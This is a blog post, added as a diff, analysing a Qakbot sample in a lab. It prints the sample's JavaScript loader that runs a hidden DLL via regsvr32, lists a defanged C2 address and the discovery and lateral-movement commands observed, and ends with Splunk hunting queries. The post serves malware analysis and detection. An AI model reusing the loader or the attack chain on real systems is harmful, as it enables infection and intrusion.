@@ -1,0 +1,98 @@
+---
+layout: post
+title:  "Qakbot"
+tags: [sysmon, splunk, threat hunting, qakbot, malware]
+author: jouni
+image: assets/images/qakbot.png
+comments: false
+categories: [ threat hunting ]
+---
+
+Qakbot - anything new on a recent sample?
+=========================================
+
+![]({{ site.baseurl }}/assets/images/qakbot.png)
+
+I've been looking through tria.ge to see what has been the recent trend in the malware world. For the last couple of days the majority of the samples supplied (no actual statistics, just a hunch based on looking at the recently uploaded samples) has been Qakbot. Also there has been a few Asyncrat samples and a ton of random others. I decided to grab a sample of Qakbot to see if there is something new to be seen. The sample was [this](https://tria.ge/221119-g7k7dagg25).
+
+It contains **ContractCopy\_YZ62.img** file, which I mounted to Windows. The image file contains couple of files, but the **ContractCopy.js** is the only one that is not hidden for the user. The file has the following contents:
+    
+    var q = WScript.CreateObject("Scripting.FileSystemObject").OpenTextFile("data.txt", 1).ReadAll();
+    /**
+    Signed
+    */
+    WScript.CreateObject("shell.application").shellexecute("reg" + q, "addled\\soloists.tmp", "", "open", 1);
+    
+It basically launches the DLL file which is stored under the **addled** folder, with the name of **soloists.tmp**. I verified that the file is indeed a DLL file with SHA1 hash of **e706be44c0bf3cf12ee1b357b0d037f172a5220a**. What happens next is that the **soloist.tmp** file is launched with **regsvr32.exe.**
+
+![]({{ site.baseurl }}/assets/images/qbot_1.png)
+
+Next, the **regsvr32.exe** accesses the legitimate process **wermgr.exe.** After this, the malware starts to connect to the C2 server, on IP 217\[.\].128.91.196 using port 2222. The C2 server address and port is constantly changing. A while later, the process starts to launch the typical commands that any of the loaders tend to do. For example, **net view**, **whoami /all**, **nestat -nao**, **route print** and **nslookup.**
+
+![]({{ site.baseurl }}/assets/images/qbot_2.png)
+
+After this, the malware seems to get quiet. Maybe the results of the queries were deemed non interesting, it is quite easy to determine that this isn't a real environment. The malware continues to connect to the C2 server every now and then. What is interesting is that I haven't been able to observe any sort of persistence mechanism being created. Maybe it would only have been created if a further payload would have been launched? I decided to play the waiting game and wait at least some hours to see if something will happen.
+
+Wait.. it actually GOT active once more?
+========================================
+
+![]({{ site.baseurl }}/assets/images/qbot_3-1024x237.png)I've been gone for couple of hours and took a look if there was something going on. It seems that the process was starting ping.exe and also creating a remote thread (injecting) to the ping.exe. This seems a little weird and I have no explanation of why this would be. However, I am fairly certain that **wermgr.exe** shouldn't be doing this legitimately. The **ping.exe** process was started with **\-t 127.0.0.1** commandline, so constantly pinging localhost. The process was terminated couple of seconds later.
+
+The **wermgr.exe** writes a file **c:\\Windows\\SysWOW64\\afzgd32.dll** moments later. This was not present anymore in the disk so I couldn't check the file hash for it, unfortunately. Also, it seems that this file was never loaded by any process. Nevertheless, it seems that the process initiated a connection to my WEF server and Domain Controller after that.
+
+![]({{ site.baseurl }}/assets/images/qbot_4-1024x797.png)After the connections were initiated, there seems to be a quite interesting service being created on both on the **WEF** server and the **domain controller**. A Malicious DLL is created to **c$ share** which then launched as a service. This creates the persistence which was missing from the original host to DC and WEF.
+
+There wasn't a file creation event in Sysmon for the creation of the DLL file, which I don't know the reason of. Maybe this is related to the configuration that is used in DetectionLab, as I have not modified the configuration. The file itself is found from the root of the C: -drive with another file that is later created as a service too. The file is the same though.
+
+The malicious DLL file continues to inject into the **wrmgr.exe** as it did on the original host. It is likely that the file is pretty much the same than the original malicious DLL file. SHA1 hash of the file is E59C813E4ECE039221DF119069501B5C811ACBFE - I uploaded it to [VirusTotal](https://www.virustotal.com/gui/file/e8529481b15435580f690cfe471915d68a2a3b6f4695c4a6a9b3bd540a95f123). Virustotal didn't really give out too much about this sample. Could be interesting to do more analysis on it.
+
+I continued to look at the activity by the malware but there wasn't anything too interesting which would catch my eye. The malware continued to connect to the command servers. There were still the several ports and IP-addresses to which the malware connected to. During the day, the malware connected to **92** distinct IP-addresses and to **8** distinct ports. The ports where the following, with counts in brackets **443** (1280), **995** (141), **22** (87), **2222** (60), **80** (30), **32103** (12), **1900** (3) and **65400** (3). It is likely that all of them are not malicious. I would assume that some of them were used to fetch the CRL lists for example.
+
+![]({{ site.baseurl }}/assets/images/qbot_5-1024x341.png)The malware continues to run discovery commands. It runs mostly the same commands as before on the Windows 10 host, however there are some additions. For example, the malware tries to gain information of domain trusts by running the **nltest /domain\_trusts /all\_trusts** command. Nothing quite interesting though. I did create a pie chart of Commandlines of the processes which have been started by the now injected **wermgr.exe** process. Almost all the commands were ran the same amount of time so it is likely built-in to the malware.
+
+I decided to kill the connection to the environment at this point. It should be quite isolated but can't be completely certain so I'd rather not leave the malware running too long. I took some dumps from the hosts for further analysis and suspended the hosts, waiting to be nuked from the orbit. Next, a little threat hunting so that I don't completely drift out of the purpose of the blog!
+
+Threat hunting
+==============
+
+Hunting for Command & Control traffic can be hard. In this instance I can explain why; the malware is connecting to several different servers to several different ports and the actual interval between of the callbacks changes by a long margin. Sometimes the malware continues to call home on a single minute interval and sometimes it is much longer. I know that many people have tried to tackle this issue and there are great sources for this like [RITA](https://www.activecountermeasures.com/free-tools/rita/). I don't really tend to go further in this subject - it requires a lot skills in data analytics which goes much beyond my current capabilities.
+
+So what about the endpoint based hunting? Well there are some things that can be done. First, let's look at the process start of regsvr32.exe (to get the parent commandline) and join that data to injection event. I added the two full image paths for regsvr32.exe. Could be done more easily with the OriginalFileName field, for example.
+
+    index=sysmon EventCode=1 AND (Image="C:\\Windows\\System32\\regsvr32.exe" OR Image="C:\\Windows\\SysWOW64\\regsvr32.exe") 
+    | table _time, host, CommandLine, Image, ParentImage, ParentCommandLine, ProcessId 
+    | rename ProcessId as SourceProcessId, Image as SourceImage 
+    | join type=inner host SourceProcessId SourceImage [search index=sysmon AND (SourceImage="C:\\Windows\\System32\\regsvr32.exe" OR SourceImage="C:\\Windows\\SysWOW64\\regsvr32.exe") EventCode=10 
+    | table _time, host, SourceProcessId, SourceImage, TargetImage, TargetProcessId]
+    
+    
+
+The next query just adds a one more join - join if there is a network connection initiated by the process which has been injected to.
+
+    index=sysmon EventCode=1 AND (Image="C:\\Windows\\System32\\regsvr32.exe" OR Image="C:\\Windows\\SysWOW64\\regsvr32.exe") 
+    | table _time, host, CommandLine, Image, ParentImage, ParentCommandLine, ProcessId 
+    | rename ProcessId as SourceProcessId, Image as SourceImage 
+    | join type=inner host SourceProcessId SourceImage [search index=sysmon AND (SourceImage="C:\\Windows\\System32\\regsvr32.exe" OR SourceImage="C:\\Windows\\SysWOW64\\regsvr32.exe") EventCode=10 
+    | table _time, host, SourceProcessId, SourceImage, TargetImage, TargetProcessId] 
+    | rename TargetProcessId as ProcessId, TargetImage as Image 
+    | join type=outer host ProcessId [search index=sysmon EventCode=3 NOT (DestinationIp="10.0.0.0/8" OR DestinationIp="172.16.0.0/12" OR DestinationIp="192.168.0.0/16") 
+    | table host ProcessId Image DestinationIp DestinationPort]
+    
+    
+
+This adds the outbound connection to the results too. ![]({{ site.baseurl }}/assets/images/qbot_6.png)
+
+There are also options to hunt for the lateral movement seen, for example based on the service creation of the abnormal sort. Here is a short query for this using the System log. There are many many other ideas that come from this too but I need to leave something to you readers too.
+
+    index=wineventlog EventCode=7045 Service_File_Name="*regsvr32.exe*" 
+    | table _time, host, Service_File_Name, Service_Name, Sid
+    
+
+Closing words
+=============
+
+This was VERY interesting to do. I had a lot of fun while analyzing Qbot, however it was also quite stressful as I don't really want the malware to escape my lab. I wouldn't really recommend this type of analysis to anyone but it is heck of a fun. It is likely that I will continue to do these kind of posts in the future too, probably playing with recent samples that seem to have significant presence.
+
+I might also have a way to deploy MDE, which I might use in the future once more. One option would also be to ingest Sysmon data to my Log Analytics space as I am much much more familiar with KQL than SPL but we will see.
+
+Thanks for reading this far!
